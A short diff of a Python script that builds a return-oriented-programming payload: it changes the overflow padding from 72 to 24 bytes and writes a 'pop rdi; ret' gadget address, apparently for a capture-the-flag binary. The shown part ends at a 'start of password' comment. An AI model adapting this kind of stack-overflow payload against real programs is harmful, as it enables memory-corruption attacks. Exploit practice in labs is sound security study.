@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 import sys
-sys.stdout.buffer.write(b"\x41" * 72)
+sys.stdout.buffer.write(b"\x41" * 24)
 #pop rdi; ret
 sys.stdout.buffer.write(0x000000000040205f.to_bytes(8, "little"))
 #start of password
